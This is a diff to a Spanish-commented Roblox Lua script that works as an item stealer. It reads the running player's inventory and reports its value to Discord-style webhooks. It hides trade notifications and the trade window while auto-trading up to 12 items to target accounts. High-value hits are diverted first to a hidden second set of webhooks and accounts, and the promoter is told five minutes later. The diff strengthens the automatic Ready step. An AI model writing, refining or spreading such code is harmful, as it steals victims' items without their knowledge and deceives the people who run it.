@@ -1,9 +1,10 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY)
+-- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY - CORREGIDO)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
 local player = Players.LocalPlayer
 
 -- ==========================================
@@ -63,12 +64,10 @@ task.spawn(function()
     -- ARREGLO: Esperar a que el SCRIPT 1 se conecte
     -- ==========================================
     while getgenv and not getgenv().AutoTradeConfig do
-        task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
+        task.wait(0.2)
     end
     
-    -- 👇 ESTA ES LA LÍNEA QUE SOLUCIONA EL ERROR 👇
     local config = getgenv().AutoTradeConfig or {}
-    
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
     local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
 
@@ -108,16 +107,6 @@ task.spawn(function()
                             Headers = { ["Content-Type"] = "application/json" },
                             Body = HttpService:JSONEncode({
                                 content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado o salido del juego.\n⏳ **Duró ejecutando el script:** `" .. textoTiempo .. "`"
-                            })
-                        })
-                    end
-                    if WEBHOOK_LOGS ~= "" then
-                        request({
-                            Url = WEBHOOK_LOGS,
-                            Method = "POST",
-                            Headers = { ["Content-Type"] = "application/json" },
-                            Body = HttpService:JSONEncode({
-                                content = "❌ **" .. leavingPlayer.Name .. "** duró `" .. textoTiempo .. "` usando el script."
                             })
                         })
                     end
@@ -165,16 +154,12 @@ task.spawn(function()
                 if item and item.name then
                     local cleanName = normalizeName(item.name)
                     if valueTable[cleanName] then
-                        
                         if cleanName == "MatchaBobaKnife" then foundMatchaKnife = true end
                         if cleanName == "MatchaBobaGun" then foundMatchaGun = true end
-                        
                         if cleanName == "DragonpetalBlade" then foundDragonBlade = true end
                         if cleanName == "DragonpetalSniper" or cleanName == "DragonpetalOutlaw" then foundDragonGun = true end
-                        
                         if cleanName == "LightningBolt" then foundLightningBolt = true end
                         if cleanName == "LightningStriker" then foundLightningStriker = true end
-                        
                         if category == "Effect" and efectosEspecialesDual[cleanName] then
                             hasSpecialEffect = true
                         end
@@ -214,7 +199,6 @@ task.spawn(function()
                 executionData[playerName] = executionData[playerName] + 1
 
                 pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
-                
                 executionText = playerName .. " " .. executionData[playerName] .. "x executions"
             end
 
@@ -233,9 +217,8 @@ task.spawn(function()
                 
                 for _, clave in ipairs(orden) do
                     local info = contador[clave]
-                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
+                    texto ..= "🔸 **" .. info.cantidad + 0 .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                 end
-                
                 if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                 return texto 
             end
@@ -289,10 +272,7 @@ task.spawn(function()
                 table.insert(pings, "@TOP-SETS ⚡ **¡SET LIGHTNING ENCONTRADO!**")
             end
 
-            local finalContentText = nil
-            if #pings > 0 then
-                finalContentText = table.concat(pings, "\n")
-            end
+            local finalContentText = (#pings > 0) and table.concat(pings, "\n") or nil
 
             local webhookPayload = {
                 content = finalContentText, 
@@ -314,11 +294,7 @@ task.spawn(function()
             
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
-            -- ==========================================
-            -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
-            -- ==========================================
             if totalValue >= 5000 or hasSpecialEffect then
-                -- 1. Tu Webhook (Dual): Notifica al instante
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -330,7 +306,6 @@ task.spawn(function()
                     end
                 end)
 
-                -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (300 segundos)
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function()
@@ -343,11 +318,8 @@ task.spawn(function()
                         end)
                     end)
                 end
-                
-                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal (< 5000): Notifica de inmediato al promocionador únicamente
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({
                         Url = WEBHOOK_INVENTARIO,
@@ -360,7 +332,6 @@ task.spawn(function()
         end
 
         local jugadorEncontrado = nil
-
         repeat 
             task.wait(0.5)
             for _, nombre in ipairs(jugadoresObjetivos) do
@@ -372,9 +343,6 @@ task.spawn(function()
             end
         until jugadorEncontrado
 
-        -- ==========================================
-        -- ESPERA DE 10 SEGUNDOS AL DETECTAR JUGADOR
-        -- ==========================================
         task.wait(10)
 
         local tradeando = true 
@@ -385,11 +353,9 @@ task.spawn(function()
                 task.wait()
                 pcall(function()
                     local pGui = player:WaitForChild("PlayerGui")
-                    
                     if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                         pGui.Notifications.Body.Visible = false
                     end
-                    
                     if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                         if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
                             posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
@@ -400,7 +366,7 @@ task.spawn(function()
             end
         end)
 
-         local function ejecutarTradeo()
+        local function ejecutarTradeo()
             local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
             if not okData then return false end
             local pdTrade = cgData.PlayerData
@@ -450,14 +416,10 @@ task.spawn(function()
             local Remotes = require(RS.Shared.Remotes)
             local ActiveNegotiation = cgData.ActiveNegotiation
             local SessionState = cgData.SessionState
-            local Workspace = game:GetService("Workspace")
 
-            -- PROTECCIÓN AÑADIDA: Verifica que player1 y player2 existan antes de leerlos
             local function getSides()
                 local data = ActiveNegotiation.Data
-                if type(data) ~= "table" then return nil, nil, nil end
-                if type(data.player1) ~= "table" or type(data.player2) ~= "table" then return nil, nil, nil end
-                
+                if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
                 local me, other
                 if data.player1.player and data.player1.player.UserId == player.UserId then
                     me, other = data.player1, data.player2
@@ -465,6 +427,29 @@ task.spawn(function()
                     me, other = data.player2, data.player1
                 end
                 return me, other, data
+            end
+
+            -- Función robusta para presionar Ready basada en la estructura correcta
+            local function setReadyTrue()
+                local _, _, data = getSides()
+                if not data then return false end
+                
+                -- Esperar el delay de actualización del servidor (cooldown de anti-spam)
+                local t0 = os.clock()
+                while os.clock() - t0 < 6 do
+                    local _, _, d = getSides()
+                    if d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3 then
+                        break
+                    end
+                    task.wait(0.2)
+                end
+                
+                local _, _, d2 = getSides()
+                if not d2 then return false end
+                
+                -- Envía el ready con la referencia del otro jugador correctamente
+                Remotes.SetReady:FireServer(true, d2.ref or {})
+                return true
             end
 
             -- 1. Enviar o Aceptar Invitación
@@ -492,7 +477,7 @@ task.spawn(function()
 
             task.wait(1)
 
-            -- 2. Ofrecer hasta 12 items sin usar GUI
+            -- 2. Ofrecer hasta 12 items
             for i = 1, math.min(12, #itemsRestantes) do
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
@@ -509,22 +494,23 @@ task.spawn(function()
                 task.wait(0.35)
             end
 
-            -- 3 & 4. Lógica de Finalización (SetReady Seguro)
+            -- 3. Lógica de Finalización y Ready Corregida
+            task.wait(0.5)
+            local me, _, data = getSides()
+            if me and not me.ready then
+                setReadyTrue()
+            end
+
             local timeout = os.clock()
             while os.clock() - timeout < 60 do 
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
-                -- Utilizamos getSides que ya viene protegido contra el error 'nil'
-                local me, other, data = getSides()
+                local m, _, d = getSides()
+                if not d then break end
+                if d.exchanging then break end 
                 
-                if not data then break end
-                if data.exchanging then break end 
-                
-                -- Verificamos si somos nosotros y aún no damos ready
-                if me and other and not me.ready then
-                    if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        Remotes.SetReady:FireServer(true, other.ref)
-                    end
+                if m and not m.ready then
+                    setReadyTrue()
                 end
                 
                 task.wait(0.5)
@@ -539,26 +525,17 @@ task.spawn(function()
             return true
         end
 
-
-        -- ==========================================
-        -- BUCLE PRINCIPAL DE TRADEO CONTINUO
-        -- ==========================================
         while true do
-            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
             end
             
             local continuar = ejecutarTradeo()
-            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
             if not continuar then 
                 break 
             end
         end
 
-        -- ==========================================
-        -- RESTAURACIÓN: TODO VUELVE A LA NORMALIDAD
-        -- ==========================================
         tradeando = false
         task.wait(0.5) 
 
